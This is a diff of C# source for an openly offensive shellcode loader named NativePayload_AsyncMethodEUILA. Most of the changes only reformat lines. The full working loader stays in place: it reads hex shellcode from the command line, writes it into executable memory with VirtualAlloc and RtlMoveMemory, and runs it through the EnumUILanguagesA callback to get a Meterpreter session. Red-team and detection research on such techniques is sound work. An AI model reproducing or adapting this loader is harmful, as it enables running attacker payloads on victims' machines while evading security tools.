@@ -23,8 +23,7 @@ namespace NativePayload_AsyncMethodEUILA
 
         // [DllImport("kernel32.dll")]
         // public static extern IntPtr LoadLibraryW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName);
-        // [DllImport("kernel32")]
-        // public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+        
         [DllImport("ntdll.dll")]
         private static extern bool RtlMoveMemory(IntPtr addr, byte[] pay, uint size);
         [DllImport("kernelbase.dll")]
@@ -33,17 +32,23 @@ namespace NativePayload_AsyncMethodEUILA
         private static extern bool EnumUILanguagesA(IntPtr lpUILanguageEnumProc, uint dwFlags, IntPtr lParam);
         [DllImport("kernel32.dll")]
         private static extern bool EnumUILanguagesA(AsyncCallBack ops, uint dwFlags, IntPtr lParam);
+        
         public static string pay = "";
         public delegate void AsyncCallBack();
+        
         public static void myCodeExe()
         {
-            string[] X = pay.Split(',');byte[] Xpayload = new byte[X.Length];
-            for (int i = 0; i < X.Length;) { Xpayload[i] = Convert.ToByte(X[i], 16); i++; } Console.WriteLine();
+            string[] X = pay.Split(',');
+            byte[] Xpayload = new byte[X.Length];
+            for (int i = 0; i < X.Length;) { Xpayload[i] = Convert.ToByte(X[i], 16); i++; } 
+            Console.WriteLine();
             IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
             RtlMoveMemory(p, Xpayload, (uint)Xpayload.Length);
-            Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::VirtualAlloc.Result[" + p.ToString("X8") + "]");Console.WriteLine();
+            Console.WriteLine("[!] [" + DateTime.Now.ToString() + "]::VirtualAlloc.Result[" + p.ToString("X8") + "]");
+            Console.WriteLine();
             Console.WriteLine("Bingo: Meterpreter Session via callback functions Technique by \"EnumUILanguagesA + AsyncMethod\"  ;)");
-            bool ok = EnumUILanguagesA(p, 0, IntPtr.Zero);IntPtr pinfo = IntPtr.Zero;
+            bool ok = EnumUILanguagesA(p, 0, IntPtr.Zero);
+            // IntPtr pinfo = IntPtr.Zero;
         }
         static void Main(string[] args)
         {
@@ -53,7 +58,8 @@ namespace NativePayload_AsyncMethodEUILA
             Console.WriteLine("NativePayload_AsyncMethodEUILA , Published by Damon Mohammadbagher , Mar 2021");
             Console.ForegroundColor = ConsoleColor.Gray;
             Console.WriteLine("NativePayload_AsyncMethodEUILA Callback Functions Technique via (EnumUILanguagesA + AsyncMethod) API");
-            Console.WriteLine(); pay = args[0];
+            Console.WriteLine(); 
+            pay = args[0];
             AsyncCallBack CsharpMethod = new AsyncCallBack(myCodeExe);
             System.Threading.Thread.Sleep(5555);
             bool okAgain = EnumUILanguagesA(CsharpMethod, 0,IntPtr.Zero);
